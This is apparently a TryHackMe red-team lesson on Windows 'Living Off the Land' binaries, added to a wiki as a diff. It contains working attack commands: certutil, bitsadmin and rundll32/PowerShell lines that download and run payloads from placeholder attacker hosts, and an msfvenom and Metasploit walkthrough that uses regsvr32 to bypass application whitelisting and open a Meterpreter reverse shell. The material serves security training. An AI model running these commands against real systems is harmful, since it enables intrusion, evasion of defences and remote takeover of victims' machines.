@@ -1,0 +1,351 @@
+<!--
+title: Living off the land
+description: 
+published: true
+date: 2023-01-07T13:20:46.048Z
+tags: 
+editor: ckeditor
+dateCreated: 2023-01-07T13:20:46.048Z
+-->
+
+<h1>Introduction</h1>
+<p>What is "Living Off the Land"?</p>
+<figure class="image image_resized" style="width:533.444px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6f593d640759b852a7a920dfa11cdd21.png"></figure>
+<p><strong>Living Off the Land</strong>&nbsp;is a trending term in the red team community. The name is taken from real-life, living by eating the available food on the land.&nbsp;Similarly, adversaries and malware creators take advantage of a target computer's built-in tools and utilities. The term <strong>Living Off the Land</strong>&nbsp;was introduced at <a href="https://www.youtube.com/watch?v=j-r6UonEkUw">DerbyCon3</a> in 2013 and has gained more traction in the red team community ever since, becoming an often used and popular technique.</p>
+<p>These built-in tools perform various regular activities within the target system or network capabilities; however, they are increasingly used and abused, for example, using the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">CertUtil </a>tool to download malicious files into the target machine.</p>
+<p>The primary idea is to use Microsoft-signed programs, scripts, and libraries to blend in and evade defensive controls. Red teamers do not want to get detected when executing their engagement activities on the target, so utilizing these tools is safer to maintain their stealth.</p>
+<p>The following are some categories that Living Off the Land encompasses:</p>
+<ul>
+  <li>Reconnaissance</li>
+  <li>Files operations</li>
+  <li>Arbitrary&nbsp;code execution</li>
+  <li>Lateral movement</li>
+  <li>Security product bypass</li>
+</ul>
+<p>Learning objectives</p>
+<ul>
+  <li>Learn about the term&nbsp;<strong>Living Off the Land</strong>&nbsp;of red team engagements.</li>
+  <li>Learn about the LOLBAS project and how to use it.</li>
+  <li>Understand and apply the techniques used in red teaming engagements.</li>
+</ul>
+<p>Room prerequisites</p>
+<ul>
+  <li>Basic knowledge of general hacking techniques.</li>
+  <li>&nbsp;Completing the <a href="https://tryhackme.com/path-action/jrpenetrationtester/join">Jr. Penetration Tester</a> Learning Path.</li>
+  <li>TryHackMe <a href="https://tryhackme.com/module/red-team-initial-access">Red Team&nbsp;Initial Access module</a>.</li>
+</ul>
+<h1>Windows Sysinternals</h1>
+<p>﻿What is Windows Sysinternals?</p>
+<figure class="image image_resized" style="width:339.75px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/34c25098ffaac146cd41551ff2bd8cfb.png"></figure>
+<p>Windows Sysinternals is a set of tools and advanced system utilities developed to help IT professionals manage, troubleshoot, and diagnose the Windows operating system in various advanced topics.&nbsp;</p>
+<p>Sysinternals Suite is divided into various categories, including:</p>
+<ul>
+  <li>Disk management</li>
+  <li>Process management</li>
+  <li>Networking tools</li>
+  <li>System information</li>
+  <li>Security tools</li>
+</ul>
+<p>In order to use the Windows Sysinternals tools, we need to accept the Microsoft license agreement of these tools. We can do this by passing the&nbsp;-accepteula&nbsp;argument at the command prompt or by GUI during tool execution.</p>
+<p>The following are some popular Windows Sysinternals tools:</p>
+<figure class="table" style="text-align:center;width:856px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a><br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Helps system administrators check specified access&nbsp;for&nbsp;files, directories, Registry keys, global objects, and Windows services.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a><br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">A tool that executes programs on a remote system.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">ADExplorer</a><br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">An advanced Active Directory tool that helps to easily view and manage the AD database.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a><br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Monitors running processes for CPU spikes and the ability to dump memory for further analysis.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">ProcMon</a><br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">An essential tool for process monitoring.</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview">TCPView</a></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;text-align:center;">A tool that lists all TCP and UDP connections.</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">PsTools</a></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;text-align:center;">The first tool designed in the Sysinternals suite to help list detailed information.</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/portmon">Portmon</a></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Monitors and displays all serial and parallel port activity on a system.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/whois">Whois</a></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Provides information for a specified domain name or IP address.</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>For more information about the Sysinternals suite, you can visit the tools' web page on Microsoft Docs&nbsp;<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">here</a>.</p>
+<p><strong>Sysinternals Live</strong></p>
+<p>One of the great features of Windows Sysinternals is that there is no installation&nbsp;required. Microsoft provides a Windows Sysinternals service, Sysinternals live, with various ways to use and execute the tools. We can access and use them through:</p>
+<ul>
+  <li>Web browser (<a href="https://live.sysinternals.com/">link</a>).</li>
+  <li>Windows Share</li>
+  <li>Command prompt</li>
+</ul>
+<p>In order to use these tools, you either download them or by entering the Sysinternal Live path&nbsp;\\live.sysinternals.com\tools&nbsp;into Windows Explorer.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/75af3683c5d9263c66c2ca4a9cb23a6f.png"></figure>
+<p>Note&nbsp;that since the attached VM does not have internet access, we pre-downloaded the Sysinternal tools in&nbsp;C:\Tools\.</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt; C:\Tools\SysinternalsSuite\PsExec64.exe</code></pre>
+<p>If you are interested in learning more about Windows Sysinternals, we suggest to familiarize yourself with the following additional resources:</p>
+<ol>
+  <li>TryHackMe room: <a href="https://tryhackme.com/room/btsysinternalssg">Sysinternals</a>.</li>
+  <li>Microsoft Sysinternals Resources <a href="https://docs.microsoft.com/en-us/sysinternals/resources/">website</a>.</li>
+</ol>
+<p>Red Team utilization and benefits</p>
+<figure class="image image_resized" style="width:366.562px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e1bbd428b12ab3041748f361ba237e21.png"></figure>
+<p style="text-align:center;">&nbsp;</p>
+<p style="text-align:justify;">While built-in and Sysinternals tools are helpful for system administrators, these tools are also used by hackers, malware, and pentesters due to the inherent trust they have within the operating system. This trust is beneficial to Red teamers, who do not want to get detected or caught by any security control on the target system. Therefore, these tools have been used to evade detection and other blue team controls.</p>
+<p style="text-align:justify;">Remember that due to the increase of adversaries and malware creators using these tools nowadays, the blue team is aware of the malicious usage and has implemented defensive controls against most of them.</p>
+<h1 style="text-align:justify;">LOLBAS Project</h1>
+<p>What is&nbsp;LOLBAS?</p>
+<figure class="image image_resized" style="width:291px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa5cd3489ac1c2a6c315d637bf4ba8ce.png"></figure>
+<p>LOLBAS stands for&nbsp;<strong>L</strong>iving&nbsp;<strong>O</strong>ff the&nbsp;<strong>L</strong>and&nbsp;<strong>B</strong>inaries&nbsp;<strong>A</strong>nd&nbsp;<strong>S</strong>cripts, a project's primary main goal is to gather and document the Microsoft-signed and built-in tools used as&nbsp; Living Off the Land techniques, including binaries, scripts, and libraries.</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c98596d3c51c192ae9fd415ff06fc6b9.png"></figure>
+<p>The LOLBAS project is a community-driven repository gathering a collection of&nbsp;binaries, scripts, libraries that could be used for red team purposes. It allows to search based on binaries, functions, scripts, and ATT&amp;CK info.&nbsp;The previous image shows what the LOLBAS project page looks like at this time. If you are interested in more details about the project, you may visit the project's website&nbsp;<a href="https://lolbas-project.github.io/">here</a></p>
+<p>The LOLBAS website provides a convenient search bar to query all available data. It is straightforward to look for a binary; including the binary name will show the result. However, if we want to look for a specific function, we require providing a&nbsp;/&nbsp;before the function name. For example, if we are looking for all execute functions, we should use&nbsp;/execute.&nbsp;Similarly, in order to look based on types, we should use the&nbsp;#&nbsp;symbol followed by the type name.&nbsp;The following are the types included in the project:</p>
+<ul>
+  <li>Script</li>
+  <li>Binary</li>
+  <li>Libraries</li>
+  <li>OtherMSBinaries</li>
+</ul>
+<p><strong>Tools Criteria</strong><br>Specific criteria are required for a tool to be a "Living Off the Land" technique and accepted as part of the LOLBAS project:</p>
+<ul>
+  <li>Microsoft-signed file native to the OS or downloaded from Microsoft.</li>
+  <li>Having additional interesting unintended functionality not covered by known use cases.</li>
+  <li>Benefits an APT (Advanced Persistent Threat) or Red Team engagement.<br>&nbsp;</li>
+</ul>
+<p>Please note that if you find an exciting binary that adheres to the previously mentioned criteria, you may submit your finding by visiting the <a href="https://github.com/LOLBAS-Project/LOLBAS#criteria">GitHub repo contribution page</a> for more information.</p>
+<p><strong>Interesting Functionalities</strong></p>
+<p>The LOLBAS project accepts tool submissions that fit one of the following functionalities:</p>
+<ul>
+  <li>Arbitrary code execution</li>
+  <li>File operations, including downloading, uploading, and copying files.</li>
+  <li>Compiling code</li>
+  <li>Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.</li>
+  <li>UAC bypass</li>
+  <li>Dumping process memory</li>
+  <li>DLL injection</li>
+</ul>
+<h1>File Operations</h1>
+<p>This task shows commonly used tools based on functionalities and malware activities seen in the real world as well as in the red team engagements.</p>
+<p>This task will highlight some interesting "Living Off the Land" techniques that aim to be used in a file operation, including download, upload, and encoding.</p>
+<p><strong>Certutil</strong></p>
+<p>Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components. Therefore, the tool's normal use is to retrieve certificate information. However, people found that certutil.exe could transfer and encode files unrelated to certification services. The MITRE ATT&amp;CK framework identifies this technique&nbsp;as&nbsp;<strong>Ingress tool transfer</strong>&nbsp;(<a href="https://attack.mitre.org/techniques/T1105/">T1105</a>).</p>
+<p>To illustrate this with an example, we can use&nbsp;certutil.exe&nbsp;to download a file from an attacker's web server and store it in the Window's temporary folder, using the command below.&nbsp;Note that we use the-urlcache&nbsp;and&nbsp;-split -f&nbsp;parameters&nbsp;to enforce the tool to download from the provided URL using the split technique.</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe</code></pre>
+<p>-urlcache&nbsp;to display URL, enables the URL option to use in the command<br>-split -f&nbsp;&nbsp;to split and force fetching files from the provided URL.</p>
+<p>Also, the&nbsp;certutil.exe&nbsp;can be used as an encoding tool where we can encode files and decode the content of files.&nbsp;ATT&amp;CK&nbsp;<a href="https://attack.mitre.org/techniques/T1027/">T1027</a>&nbsp;refers to this technique to obfuscate files to make them difficult to discover or analyze.</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt; certutil -encode payload.exe Encoded-payload.txt</code></pre>
+<p>For more information about the tool, you may visit the Microsoft Document here:&nbsp;<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Microsoft Docs: CertUtil</a></p>
+<p><strong>BITSAdmin</strong></p>
+<p>The&nbsp;bitsadmin&nbsp;tool&nbsp;is a system administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS)&nbsp;jobs and check their progress. <a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">BITS </a>is a low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers. Additional information about the&nbsp;bitsadmin&nbsp;tool can be found at&nbsp;<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin">Microsoft Docs</a>.</p>
+<p>Attackers may abuse the BITS jobs to download and execute a malicious payload in a compromised machine. For more information about this technique, you may visit the ATT&amp;CK&nbsp;<a href="https://attack.mitre.org/techniques/T1197/">T1197</a>&nbsp;page.</p>
+<p>Introduce the terminal container content (revisit)</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt;bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe</code></pre>
+<p>/Transfer&nbsp;to use the transfer option<br>/Download&nbsp;we are specifying transfer using download type<br>/Priority&nbsp;we are setting the priority of the job to be running in the foreground</p>
+<p>For more information about the&nbsp;bitsadmin&nbsp;parameters, you can visit the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer">Microsoft documentation</a> of the tool.</p>
+<p><strong>FindStr</strong></p>
+<p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr">Findstr&nbsp;</a>is a Microsoft built-in tool used to find text and string patterns in files. The findstr tool is useful in that helps users and system administrators to search within files or parsed output. For example, if we want to check whether port 8080 is open on our machine, then we can pipe the result of netstat to find that port as follows:&nbsp;netstat -an| findstr "445".</p>
+<p>However, an unintended way was found by using&nbsp;findstr.exe&nbsp;to download remote files from SMB shared folders within the network as follows,</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt;findstr /V dummystring \\MachineName\ShareFolder\test.exe &gt; c:\Windows\Temp\test.exe</code></pre>
+<p>/V&nbsp;to print out the lines that don't contain the string provided.</p>
+<p>dummystring&nbsp;the text to be searched for; in this case, we provide a string that must not be found in a file.</p>
+<p>&gt; c:\Windows\Temp\test.exe&nbsp;redirect the output to a file on the target machine.&nbsp;</p>
+<p>Note that other tools can be used for the file operation. We suggest visiting the&nbsp;<a href="https://lolbas-project.github.io/">LOLBAS&nbsp;</a>project to check them out.</p>
+<p>In the next task, we will introduce some of the tools used to execute files.</p>
+<h1>File Execution</h1>
+<p>This task shows various ways of executing a binary within the operating system.&nbsp;The typical case of executing a binary involves various known methods such as using the command line&nbsp;cmd.exe&nbsp;or from the desktop. However, other ways exist to achieve payload execution by abusing other system binaries, of which one of the reasons is to hide or harden the payload's process. Based on the MITRE ATT&amp;CK framework, this technique is called&nbsp;<strong>Signed Binary Proxy Execution</strong>&nbsp;or&nbsp;<strong>Indirect Command Execution</strong>, where the attacker leverages other system tools to spawn malicious payloads. This technique also helps to evade defensive controls.</p>
+<p><strong>File Explorer</strong></p>
+<figure class="image image_resized" style="width:143px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/7f1d844fc2d17f26e1f454e47d3ab937.png"></figure>
+<p>File Explorer is a file manager and system component for Windows. People found that using the file explorer binary can execute other&nbsp;.exe&nbsp;files. This technique is called <strong>Indirect Command Execution</strong>, where the&nbsp;explorer.exe&nbsp;tool&nbsp;can be used and abused to launch malicious scripts or executables from a trusted parent process.</p>
+<p>The&nbsp;explorer.exe&nbsp;binary is located at:</p>
+<ul>
+  <li>C:\Windows\explorer.exe for the Windows 32 bits version</li>
+  <li>C:\Windows\SysWOW64\explorer.exe for the Windows 64 bits version</li>
+</ul>
+<p>In order to create a child process of&nbsp;explorer.exe&nbsp;parent, we can execute the following command:</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt; explorer.exe /root,"C:\Windows\System32\calc.exe"</code></pre>
+<p>As a result of the previous command, we popped the calculator on the desktop.</p>
+<p><strong>WMIC</strong></p>
+<p>Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures.&nbsp;The MITRE ATT&amp;CK framework&nbsp;refers to this technique as Signed Binary Proxy Execution (<a href="https://attack.mitre.org/techniques/T1218/">T1218</a>)</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt;wmic.exe process call create calc
+Executing (Win32_Process)-&gt;Create()
+Method execution successful.
+Out Parameters:
+instance of __PARAMETERS
+{
+        ProcessId = 1740;
+        ReturnValue = 0;
+};
+
+
+C:\Users\thm&gt;</code></pre>
+<p>The previous&nbsp;WMIC&nbsp;command creates a new process of a binary of our choice, which in this case calc.exe.</p>
+<p><strong>Rundll32</strong></p>
+<p>Rundll32 is a&nbsp;Microsoft&nbsp;built-in tool that loads and runs&nbsp;Dynamic Link Library&nbsp;DLL&nbsp;files within the operating system. A red team can abuse and leverage&nbsp;rundll32.exe&nbsp;to run arbitrary payloads and execute JavaScript and PowerShell scripts.&nbsp;The MITRE&nbsp;ATT&amp;CK framework identifies this as&nbsp;<strong>Signed Binary Proxy Execution: Rundll32</strong> and refers to it as <a href="https://attack.mitre.org/techniques/T1218/011/">T1218</a>.</p>
+<figure class="image image_resized" style="width:134px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6e7810eb60ad71d03aa5c39b78942770.png"></figure>
+<p>The&nbsp;rundll32.exe&nbsp;binary is located at:</p>
+<ul>
+  <li>C:\Windows\System32\rundll32.exe for the Windows 32 bits version</li>
+  <li>C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version</li>
+</ul>
+<p>Now let's try to execute a&nbsp;calc.exe&nbsp;binary as proof of concept using the&nbsp;rundll32.exe&nbsp;binary:</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt; rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");</code></pre>
+<p>In the previous command, we used the&nbsp;rundll32.exe&nbsp;binary that embeds a JavaScript component,&nbsp;eval(),&nbsp;to execute the&nbsp;calc.exe&nbsp;binary, a Microsoft calculator.</p>
+<p>As we mentioned previously, we can also execute PowerShell scripts using the&nbsp;rundll32.exe. The following command runs a JavaScript that executes a PowerShell script to download from a remote website using&nbsp;rundll32.exe.</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt; rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");</code></pre>
+<p>As a result of the previous execution, a copy of the&nbsp;script.ps1&nbsp;downloaded into memory on the target machine.</p>
+<h1>Application Whitelisting Bypasses</h1>
+<p>Bypassing&nbsp;Application Whitelisting</p>
+<p>Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time.&nbsp;Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system.&nbsp;This task focuses on LOLBAS examples that are used to bypass the Windows application whitelisting.</p>
+<p><strong>Regsvr32</strong></p>
+<p>Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs)&nbsp; in the Windows Registry.&nbsp;The regsvr.exe binary is located at:</p>
+<ul>
+  <li>C:\Windows\System32\regsvr32.exe for the Windows 32 bits version</li>
+  <li>C:\Windows\SysWOW64\regsvr32.exe for the Windows 64 bits version</li>
+</ul>
+<p>Besides its intended use,&nbsp;regsvr32.exe&nbsp;binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting. According to&nbsp;</p>
+<p><a href="https://redcanary.com/">Red Canary</a></p>
+<p>&nbsp;reports, the&nbsp;regsvr32.exe&nbsp;binary is the third most popular&nbsp;</p>
+<p><a href="https://attack.mitre.org/techniques/T1218/010/">ATT&amp;CK technique</a></p>
+<p>. Adversaries leverage&nbsp;regsvr32.exe&nbsp;to execute native code or scripts locally or remotely. The technique used in the&nbsp;regsvr32.exe&nbsp;uses trusted Windows OS components and is executed in memory, which is one of the reasons why this technique is also used to bypass application whitelisting.&nbsp;</p>
+<p>Let's try to apply this technique in real life. First, we need to create a malicious&nbsp;DLL&nbsp;file using msvenom and set up our&nbsp; Metasploit listener to receive a reverse shell. Note that we will be creating a malicious file that works for 32bit operating systems.&nbsp;We will be using the&nbsp;regsvr32.exe&nbsp;Application Whitelisting Bypass technique to run a command on a target system.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 &gt; live0fftheland.dll 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
+No encoder specified, outputting raw payload 
+Payload size: 375 bytes 
+Final size of dll file: 8704 bytes 
+
+user@machine$ user@machine$ msfconsole -q 
+msf6 &gt; use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp 
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp 
+payload =&gt; windows/meterpreter/reverse_tcp 
+msf6 exploit(multi/handler) &gt; set LHOST ATTACKBOX_IP
+LHOST =&gt; ATTACKBOX_IP
+msf6 exploit(multi/handler) &gt; set LPORT 443 
+LPORT =&gt; 443 
+msf6 exploit(multi/handler) &gt; exploit 
+
+[*] Started reverse TCP handler on ATTACKBOX_IP:443 </code></pre>
+<p>Note that we specified the output type as&nbsp;DLL&nbsp;using the-f&nbsp;argument. Once the malicious DLL file is generated, we need to deliver the payload to the victim machine. We will do this by using a webserver to serve the DLL file on our attacking machine as follows,</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ python3 -m http.server 1337</code></pre>
+<p>From the victim machine, visit the webserver of the attacking machine on port&nbsp;1337&nbsp;that we specify. Note that this port can be changed with your choice!</p>
+<p>On the victim machine, once the file DLL file is downloaded, we execute it using&nbsp;regsvr32.exe&nbsp;&nbsp;as follows,</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
+or
+C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll</code></pre>
+<p>With the second option, which is a more advanced command, we instruct the&nbsp;regsvr32.exe&nbsp;to run:</p>
+<ul>
+  <li>/s: in silent mode (without showing messages)</li>
+  <li>/n: to not call the DLL register server</li>
+  <li>/i:: to use another server since we used /n</li>
+  <li>/u: to run with unregister method</li>
+</ul>
+<p>On the attacking machine, we should receive a reverse shell.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">msf6 &gt; exploit(multi/handler) &gt; exploit 
+
+[*] Started reverse TCP handler on ATTACKBOX_IP:443 
+[*] Sending stage (175174 bytes) to 10.10.159.197 
+[*] Meterpreter session 1 opened (ATTACKBOX_IP:443 -&gt; 10.10.159.197:52845 ) at 2022-01-20 05:51:31 -0600</code></pre>
+<p>Note if we wanted to create a 64-bit&nbsp;DLL&nbsp;version, we need to specify it in the&nbsp;msfvenom&nbsp;command and run it from the victim machine using the 64bits version of&nbsp;regsvr32.exe&nbsp;at C:\Windows\SysWOW64\regsvr32.exe.</p>
+<p><strong>Bourne Again Shell (Bash)</strong></p>
+<p>In 2016, Microsoft added support for the Linux environment on Windows 10,11, and Server 2019. This feature is known as Windows Subsystem for Linux (<a href="https://docs.microsoft.com/en-us/windows/wsl/about">WSL</a>), and it exists in <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions">two WSL versions</a>: WSL1 and WSL2. WSL is a Hyper-V virtualized Linux distribution that runs on the operating system, supporting a subset of the Linux kernel and system calls. This feature is an addon that a user can install and interact with a Linux distribution. As part of WSL,&nbsp;bash.exe&nbsp;is a Microsoft tool for interacting with the Linux environment.&nbsp;</p>
+<p>People found ways to execute payloads and bypass the Windows application whitelisting since it is a Microsoft signed binary. By executing&nbsp;bash.exe -c "path-to-payload", we can execute any unsigned payload. ATT&amp;CK called this an <strong>Indirect Command execution</strong>&nbsp;technique&nbsp;where attackers abuse the Windows tools utility to obtain command executions. For more information about this technique, you may visit the <a href="https://attack.mitre.org/techniques/T1202/">T1202</a> ATT&amp;CK website.</p>
+<figure class="image image_resized" style="width:684.283px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0468b54d6174a620d130adb1edacc1c.png"></figure>
+<p>Note that you need to enable and install the Windows Subsystem for Linux in Windows 10 to use the&nbsp;bash.exe&nbsp;binary. Also, the attached VM does not have the Linux Subsystem enabled due to nested virtualization restrictions.&nbsp;</p>
+<p>Keep in mind that this section highlighted a couple of interesting tools. If you are interested in checking out the LOLBAS tools available, you may visit the <a href="https://lolbas-project.github.io/">project website</a>.</p>
+<h1>Other Techniques</h1>
+<p>This section highlights a couple of interesting techniques used, whether for initial access or persistence. The following techniques belong to the Living Off the Land umbrella since they can be used as part of the Windows environment utilities.</p>
+<p>Shortcuts</p>
+<figure class="image image_resized" style="width:277px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b1b3be212430f23ddaba1f82f2c2a566.png"></figure>
+<p>Shortcuts or symbolic links are a technique used for referring to other files or applications within the operating system. Once a user clicks on the shortcut file, the reference file or application is executed. Often, the Red team leverages this technique to gain initial access, privilege escalation, or persistence. The MITRE ATT&amp;CK framework calls this <strong>Shortcut modification technique</strong>&nbsp;<a href="https://attack.mitre.org/techniques/T1547/009/">T1547</a>, where an attacker creates or modifies a shortcut in order to take advantage of this technique.</p>
+<p>To use the shortcut modification technique, we can set the target section to execute files using:</p>
+<ul>
+  <li>Rundll32</li>
+  <li>Powershell</li>
+  <li>Regsvr32</li>
+  <li>Executable on disk</li>
+</ul>
+<p>The attached figure shows an example of a shortcut modification technique, where the attacker modified the Excel target section to execute a binary using&nbsp;rundll32.exe. We choose to execute a calculator instead of running the Excel application. Once the victim clicks on the Excel shortcut icon, the&nbsp;calc.exe&nbsp;is executed. For more information about shortcut modification, you may check&nbsp;<a href="https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md">this</a>&nbsp;GitHub repo.</p>
